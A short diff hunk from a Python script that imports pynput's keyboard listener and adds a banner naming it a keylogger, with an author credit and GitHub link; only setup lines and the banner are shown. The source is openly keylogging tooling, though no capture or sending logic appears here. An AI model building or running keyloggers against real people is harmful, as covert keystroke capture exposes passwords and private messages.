@@ -2,6 +2,15 @@ from os import write
 import pynput
 from pynput.keyboard import Key, Listener
 
+#########################
+#       Keylogger       #
+#   Author: Hifumi1337  #
+#########################
+
+print("-" * 50)
+print("Author: Hifumi1337 (https://github.com/Hifumi1337)")
+print("-" * 50)
+
 keys = []
 count = 0
 
